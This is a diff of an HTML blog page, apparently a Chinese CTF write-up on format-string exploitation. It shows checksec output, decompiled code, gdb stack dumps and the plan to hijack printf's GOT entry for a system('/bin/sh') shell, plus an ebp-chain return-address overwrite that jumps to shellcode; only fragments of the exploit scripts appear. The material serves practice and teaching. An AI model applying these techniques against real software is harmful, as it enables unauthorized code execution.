@@ -163,13 +163,12 @@
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
             <h1 id="格式化字符串漏洞题目练习"><a href="#格式化字符串漏洞题目练习" class="headerlink" title="格式化字符串漏洞题目练习"></a>格式化字符串漏洞题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。</p>
-<h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;
+<h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x8048000)</code></pre>
-<h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 {
   char s; // [esp+Ch] [ebp-10Ch]
   unsigned int v4; // [esp+10Ch] [ebp-Ch]
@@ -187,7 +186,7 @@
   exit(0);
 }</code></pre>
 <p>可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></p>
-<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code class="c">gdb-peda$ stack 0x20
+<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code>gdb-peda$ stack 0x20
 0000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)
 0004| 0xffffd254 --&gt; 0x100
 0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b
@@ -195,8 +194,7 @@
 0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40
 0020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)
 0024| 0xffffd268 --&gt; 0xf63d4e2e
-0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre>
-<pre><code class="c">gdb-peda$ fmtarg 0xffffd26c
+0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code class="c">gdb-peda$ fmtarg 0xffffd26c
 The index of format argument : 7 (&quot;\%6$p&quot;)</code></pre>
 <p>确定偏移是7，打算一会写payload时候需要补齐，就<code>.ljust</code>补成0x20的，也就是<code>offset = 7 + 0x20/4 = 15</code></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
@@ -693,7 +691,7 @@ io.interactive()</code></pre>
 <p>上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。</p>
 <p>攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p>
 <h3 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p>
-<p>如图所示，利用这个链即可。先想办法把<code>Oxffffd358</code>  改成 <code>Oxffffd32c</code> :</p>
+<p>如图所示，利用这个链即可。先想办法把<code>Oxffffd358</code>  改成 <code>Oxffffd33c</code> :</p>
 <p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p>
 <p>然后在想办法把0x8048507 这个返回地址改成我们摆放的shellcode的地址即可。</p>
 <h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
@@ -1056,9 +1054,9 @@ io.interactive()</code></pre>
               <span>
                 <i class="iconfont icon-tag"></i>
                 
-                  <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">学习记录</a>
-                
                   <a class="hover-with-bg" href="/tags/pwn">pwn</a>
+                
+                  <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">学习记录</a>
                 
               </span>
             
